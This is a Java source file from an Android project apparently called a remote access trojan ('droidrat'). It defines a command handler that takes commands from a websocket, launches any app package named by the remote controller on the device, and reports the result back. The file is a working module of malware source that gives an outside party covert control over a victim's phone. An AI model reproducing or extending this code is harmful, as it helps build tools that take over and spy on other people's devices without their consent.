package com.je_chen.droidrat_je.rat.command;

import android.content.Context;
import android.content.pm.PackageManager;
import android.util.Log;

import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;
import com.je_chen.droidrat_je.rat.modules.appintent.runapp.RunApp;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websockets;

public class RunAppCommand extends CommandFather {

    private final String TAG = "Run App Event";

    private Context context;

    private RunApp runApp;

    public RunAppCommand(Context context, PackageManager packageManager) {
        this.context = context;
        runApp = new RunApp(packageManager);
    }

    @Override
    public void send(String value) {
        websockets.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {

                case "RunApp":
                    String packageName = rawCommandArray[2];
                    Log.d(TAG, "Run App :" + packageName);
                    runApp.launchApp(context, rawCommandArray[2]);
                    this.send("RunApp RunApp " + packageName);
                    break;

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
